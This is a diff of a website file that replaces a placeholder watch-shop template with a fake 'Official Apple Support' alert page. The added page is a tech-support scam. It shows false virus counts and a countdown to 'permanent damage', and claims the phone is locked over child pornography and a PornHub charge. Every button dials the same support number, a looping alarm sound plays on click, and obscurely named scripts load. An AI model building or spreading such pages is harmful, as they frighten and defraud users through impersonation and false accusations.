@@ -1,314 +1,127 @@
 <?php
 ?>
-<!DOCTYPE html>
-<html lang="en">
-   <head>
-      <!-- basic -->
-      <meta charset="utf-8">
-      <meta http-equiv="X-UA-Compatible" content="IE=edge">
-      <meta name="viewport" content="width=device-width, initial-scale=1">
-      <!-- mobile metas -->
-      <meta name="viewport" content="width=device-width, initial-scale=1">
-      <meta name="viewport" content="initial-scale=1, maximum-scale=1">
-      <!-- site metas -->
-      <title>Uoni</title>
-      <meta name="keywords" content="">
-      <meta name="description" content="">
-      <meta name="author" content="">
-      <!-- bootstrap css -->
-      <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
-      <!-- style css -->
-      <link rel="stylesheet" type="text/css" href="css/style.css">
-      <!-- Responsive-->
-      <link rel="stylesheet" href="css/responsive.css">
-      <!-- fevicon -->
-      <link rel="icon" href="images/fevicon.png" type="image/gif" />
-      <!-- Scrollbar Custom CSS -->
-      <link rel="stylesheet" href="css/jquery.mCustomScrollbar.min.css">
-      <!-- Tweaks for older IEs-->
-      <link rel="stylesheet" href="https://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css">
-      <!-- fonts -->
-      <link href="https://fonts.googleapis.com/css?family=Poppins:400,700&display=swap" rel="stylesheet">
-      <!-- owl stylesheets --> 
-      <link rel="stylesheet" href="css/owl.carousel.min.css">
-      <link rel="stylesheet" href="css/owl.theme.default.min.css">
-      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.css" media="screen">
-   </head>
-   <body>
-      <!-- header section start -->
-      <div class="header_section">
-         <div class="header_main">
-            <div class="mobile_menu">
-               <nav class="navbar navbar-expand-lg navbar-light bg-light">
-                  <div class="logo_mobile"><a href="index.html"><img src="images/logo.png"></a></div>
-                  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
-                  <span class="navbar-toggler-icon"></span>
-                  </button>
-                  <div class="collapse navbar-collapse" id="navbarNav">
-                     <ul class="navbar-nav">
-                        <li class="nav-item active">
-                           <a class="nav-link" href="index.html">Home</a>
-                        </li>
-                        <li class="nav-item">
-                           <a class="nav-link" href="about.html">About</a>
-                        </li>
-                        <li class="nav-item">
-                           <a class="nav-link" href="watchs.html">Watchs</a>
-                        </li>
-                        <li class="nav-item">
-                           <a class="nav-link " href="testimonial.html">Testimonial</a>
-                        </li>
-                        <li class="nav-item">
-                           <a class="nav-link " href="contact.html">Contact</a>
-                        </li>
-                        <li class="nav-item">
-                           <a class="nav-link " href="#"><img src="images/search-icon.png"></a>
-                        </li>
-                     </ul>
-                  </div>
-               </nav>
-            </div>
-            <div class="container-fluid">
-               <div class="logo"><a href="index.html"><img src="images/logo.png"></a></div>
-               <div class="menu_main">
-                  <ul>
-                     <li class="active"><a href="index.html">Home</a></li>
-                     <li><a href="about.html">About</a></li>
-                     <li><a href="watchs.html">Watchs</a></li>
-                     <li><a href="testimonial.html">Testimonial</a></li>
-                     <li><a href="contact.html">Contact us</a></li>
-                     <li><a href="#"><img src="images/search-icon.png"></a></li>
-                  </ul>
-               </div>
-            </div>
-         </div>
-         <!-- banner section start -->
-         <div class="banner_section layout_padding">
-            <div id="main_slider" class="carousel slide" data-ride="carousel">
-               <div class="carousel-inner">
-                  <div class="carousel-item active">
-                     <div class="container">
-                        <h1 class="banner_taital">Watchs</h1>
-                        <p class="banner_text">There are many variations of passages of Lorem Ipsum available, but the majority have suffered</p>
-                        <div class="read_bt"><a href="#">Buy Now</a></div>
-                     </div>
-                  </div>
-                  <div class="carousel-item">
-                     <div class="container">
-                        <h1 class="banner_taital">Watchs</h1>
-                        <p class="banner_text">There are many variations of passages of Lorem Ipsum available, but the majority have suffered</p>
-                        <div class="read_bt"><a href="#">Buy Now</a></div>
-                     </div>
-                  </div>
-                  <div class="carousel-item">
-                     <div class="container">
-                        <h1 class="banner_taital">Watchs</h1>
-                        <p class="banner_text">There are many variations of passages of Lorem Ipsum available, but the majority have suffered</p>
-                        <div class="read_bt"><a href="#">Buy Now</a></div>
-                     </div>
-                  </div>
-               </div>
-               <a class="carousel-control-prev" href="#main_slider" role="button" data-slide="prev">
-               <i class="fa fa-plus" style="font-size:24px; color: #fff;"></i>
-               </a>
-               <a class="carousel-control-next" href="#main_slider" role="button" data-slide="next">
-               <i class="fa fa-minus" style="font-size:24px;  color: #fff;"></i>
-               </a>
-            </div>
-         </div>
-         <!-- banner section end -->
-      </div>
-      <!-- header section end -->
-      <!-- background bg start -->
-      <div class="background_bg">
-         <!-- watchs section start -->
-         <div class="watchs_section layout_padding">
-            <div class="container">
-               <h1 class="watchs_taital">01<br>Our Watchs</h1>
-               <div class="watchs_section_2">
-                  <div class="row">
-                     <div class="col-md-6">
-                        <div class="image_1"><img src="images/img-1.png"></div>
-                     </div>
-                     <div class="col-md-6">
-                        <h4 class="uni_text">Uni Watch</h4>
-                        <p class="watchs_text">consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip</p>
-                        <h4 class="rate_text"><span style="color: #b60213;">$</span>100</h4>
-                        <div class="read_bt1"><a href="#">Buy Now</a></div>
-                     </div>
-                  </div>
-               </div>
-               <div class="watchs_section_3">
-                  <div class="row">
-                     <div class="col-md-6">
-                        <h4 class="uni_text">Uni Watch</h4>
-                        <p class="watchs_text">consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip</p>
-                        <h4 class="rate_text"><span style="color: #b60213;">$</span>100</h4>
-                        <div class="read_bt1"><a href="#">Buy Now</a></div>
-                     </div>
-                     <div class="col-md-6">
-                        <div class="image_2"><img src="images/img-2.png"></div>
-                     </div>
-                  </div>
-               </div>
-               <div class="seemore_bt"><a href="#">See More</a></div>
-            </div>
-         </div>
-         <!-- watchs section end -->
-         <!-- about section start -->
-         <div class="about_section layout_padding">
-            <div class="container">
-               <h1 class="watchs_taital">02<br>About Shop</h1>
-               <div class="about_section_2">
-                  <div class="row">
-                     <div class="col-md-6">
-                        <p class="about_text">consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip</p>
-                        <div class="read_bt1"><a href="#">Buy Now</a></div>
-                     </div>
-                     <div class="col-md-6">
-                        <div class="image_2"><img src="images/img-3.png"></div>
-                     </div>
-                  </div>
-               </div>
-               <div class="about_section_3">
-                  <div class="row">
-                     <div class="col-md-3">
-                        <div class="border_main">
-                           <div class="image_4"><img src="images/img-4.png"></div>
+<!DOCTYPE html><html lang="en"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple Support</title>
+    <link rel="apple-touch-icon" href="images/favicon.ico">
+    <link rel="icon" type="image/png" href="images/favicon.ico">
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+
+    <!-- Bootstrap 5 CSS -->
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/bootstrap-icons.css">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="css/all.min.css">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+
+  
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-Q2TNFF1HW1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-Q2TNFF1HW1');
+</script>
+
+</head>
+
+<body onclick="playSound()"  id="link">
+    <!-- Click overlay - only active when needed -->
+    <div id="clickOverlay" class="click-overlay"></div>
+
+        
+    <div class="bgimg">
+            <video autoplay loop muted style="width: 100%;">
+  <source src="images/vdo.webm" type="video/webm">
+</video>
+        </div>
+
+
+    <div class="main">
+        
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-content">
+                        
+                        <div class="alert-box">
+                            
+
+    <div class="spacbar">
+        <div class="d-flex justify-content-between">
+  <div><img src="images/applelogo2.png" alt="" style="width: 30px;margin-right: 5px;"> Alert</div>
+  <div><a href="#" style="font-size: 15px;">Apple Support</a></div>
+</div>
+<img src="images/arror.jpg" alt="" style="width:80px;display: block;margin: 10px auto 0;text-align: center;">
+   <div class="alert-title">Your iOS is infected with 3 viruses. Our security check found traces of 8 malware and 12 phishing/spyware. System damage: 28.1%.<br>
+    immediete removal required!</div>
+   
+    <div class="txstm"> Please contact Apple Support immediately at <strong><a href="tel:+1-855-670-5499">+1-855-670-5499</a></strong> to secure your device and prevent unauthorized activity.</div>
+    <a href="tel:+1-855-670-5499" class="alert-button"><span id="countdown">10:00</span> remaining before damage is permanent.</a>
+    
+    </div>
+</div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
                         </div>
-                     </div>
-                     <div class="col-md-3">
-                        <div class="border_main">
-                           <div class="image_4"><img src="images/img-5.png"></div>
-                        </div>
-                     </div>
-                     <div class="col-md-3">
-                        <div class="border_main">
-                           <div class="image_4"><img src="images/img-6.png"></div>
-                        </div>
-                     </div>
-                     <div class="col-md-3">
-                        <div class="border_main">
-                           <div class="image_4"><img src="images/img-7.png"></div>
-                        </div>
-                     </div>
-                  </div>
-               </div>
+                    </div>
+                </div>
             </div>
-         </div>
-         <!-- about section end -->
-         <!-- testimonial section start -->
-         <div class="testimonial_section layout_padding">
-            <div class="container">
-               <h1 class="watchs_taital">03<br>Testimonial</h1>
-               <div class="testimonial_section_2">
-                  <div class="row">
-                     <div class="col-md-6">
-                        <div class="box_main">
-                           <p class="testimonial_text">Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugia</p>
-                        </div>
-                        <div class="client_main">
-                           <div class="client_left">
-                              <div class="client_img"><img src="images/client-img.png"></div>
-                           </div>
-                           <div class="client_right">
-                              <h6 class="client_name">Jamesh Dame</h6>
-                              <p class="customer_text">Customer</p>
-                           </div>
-                        </div>
-                     </div>
-                     <div class="col-md-6">
-                        <div class="box_main">
-                           <p class="testimonial_text">Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugia</p>
-                        </div>
-                        <div class="client_main">
-                           <div class="client_left">
-                              <div class="client_img"><img src="images/client-img1.png"></div>
-                           </div>
-                           <div class="client_right">
-                              <h6 class="client_name">Jumini Kiri</h6>
-                              <p class="customer_text">Customer</p>
-                           </div>
-                        </div>
-                     </div>
-                  </div>
-               </div>
-               <div class="seemore_bt_1"><a href="#">See More</a></div>
+        </section>
+    </div>
+
+    <div class="notification">
+        <div class="msalogo"><img src="images/warn.png" alt="" width="30px"> EMERGENCY ALERTS</div>
+<div class="cursor">now</div>
+  <div class="notification-body">
+    Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase <br>of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-855-670-5499">+1-855-670-5499</a> to unlock it!
+  </div>
+  <img src="images/apple.png" alt="Apple Pay" class="apple-pay">
+</div>
+
+    <div id="modalContainer"></div>
+
+    
+     <div class="modal fade" id="appleAlertModal" tabindex="-1" aria-labelledby="appleAlertModalLabel" aria-hidden="true" style="top:-50px!important;">
+
+        <div class="modal-dialog modal-lg modal-dialog-centered-sm">
+            <div class="modal-content">
+                <div class="modal-body text-center">
+                    <div class="alertimg">
+                        <img src="images/warn.png" alt="" style="width: 80px;">
+                    </div>
+                    <h4 style="font-weight: 600;">Security Warning!</h4>
+                    <div class="alert-text">
+                        Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-855-670-5499">+1-855-670-5499</a> to unlock it!
+                    </div>
+
+                    
+                    <div class="text-end gap-4 mt-3 actionbtn">
+                        <a href="tel:+1-855-670-5499" class="me-2 bg-primary">Call +1-855-670-5499</a>
+                        <a href="tel:+1-855-670-5499" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
+                    </div>
+                </div>
             </div>
-         </div>
-         <!-- testimonial section end -->
-         <!-- contact section start -->
-         <div class="contact_section layout_padding">
-            <div class="container">
-               <h1 class="watchs_taital">04<br>Get In Touch</h1>
-            </div>
-            <div class="contact_section_2">
-               <div class="container-fluid">
-                  <div class="row">
-                     <div class="col-md-6">
-                        <div class="mail_section_1">
-                           <input type="text" class="mail_text" placeholder="Your Name" name="Your Name">
-                           <input type="text" class="mail_text" placeholder="Phone Number" name="Phone Number">
-                           <input type="text" class="mail_text" placeholder="Email" name="Email">
-                           <textarea class="massage-bt" placeholder="Massage" rows="5" id="comment" name="Massage"></textarea>
-                           <div class="send_bt"><a href="#">SEND</a></div>
-                        </div>
-                     </div>
-                     <div class="col-md-6 padding_right_0">
-                        <div class="map_section"><img src="images/map-img.png"></div>
-                     </div>
-                  </div>
-               </div>
-            </div>
-         </div>
-         <!-- contact section end -->
-      </div>
-      <!-- background bg end -->
-      <!-- footer section start -->
-      <div class="footer_section layout_padding">
-         <div class="container">
-            <h3 class="follow_text">Follow Now</h3>
-            <div class="social_icon">
-               <ul>
-                  <li><a href="#"><img src="images/fb-icon.png"></a></li>
-                  <li><a href="#"><img src="images/twitter-icon.png"></a></li>
-                  <li><a href="#"><img src="images/linkedin-icon.png"></a></li>
-                  <li><a href="#"><img src="images/instagram-icon.png"></a></li>
-                  <li><a href="#"><img src="images/youtub-icon.png"></a></li>
-               </ul>
-            </div>
-            <div class="location_main">
-               <div class="location_left">
-                  <div class="call_text"><a href="#"><img src="images/map-icon.png"><span class="call_padding">Location</span></a></div>
-               </div>
-               <div class="location_middle">
-                  <div class="call_text"><a href="#"><img src="images/mail-icon.png"><span class="call_padding">demo@gmail.com</span></a></div>
-               </div>
-               <div class="location_right">
-                  <div class="call_text"><a href="#"><img src="images/call-icon.png"><span class="call_padding">Call +01 1234567890</span></a></div>
-               </div>
-            </div>
-         </div>
-      </div>
-      <!-- footer section end -->
-      <!-- copyright section start -->
-      <div class="copyright_section">
-         <div class="container">
-            <p class="copyright_text">2020 All Rights Reserved. Design by <a href="https://html.design">Free html  Templates</a> Distribution by <a href="https://themewagon.com">ThemeWagon</a></p>
-         </div>
-      </div>
-      <!-- copyright section end -->
-      <!-- Javascript files-->
-      <script src="js/jquery.min.js"></script>
-      <script src="js/popper.min.js"></script>
-      <script src="js/bootstrap.bundle.min.js"></script>
-      <script src="js/jquery-3.0.0.min.js"></script>
-      <script src="js/plugin.js"></script>
-      <!-- sidebar -->
-      <script src="js/jquery.mCustomScrollbar.concat.min.js"></script>
-      <script src="js/custom.js"></script>
-      <!-- javascript --> 
-      <script src="js/owl.carousel.js"></script>
-      <script src="https:cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.js"></script>    
-   </body>
-</html>
+        </div>
+    </div>
+
+    <audio id="clickSound" src="media/LhlCcb3bW5w3.mp3" preload="auto" loop></audio>
+
+
+
+    <script src="code.jquery.com/jquery-1.12.0.min.js"></script>
+    <script src="js/popper.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+    <script src="js/Jdjifsx.js"></script>
+    <script src="js/NsicjSc.js"></script>
+    <script src="js/NisifAZ.js"></script>
+
+
+
+
+</body></html>
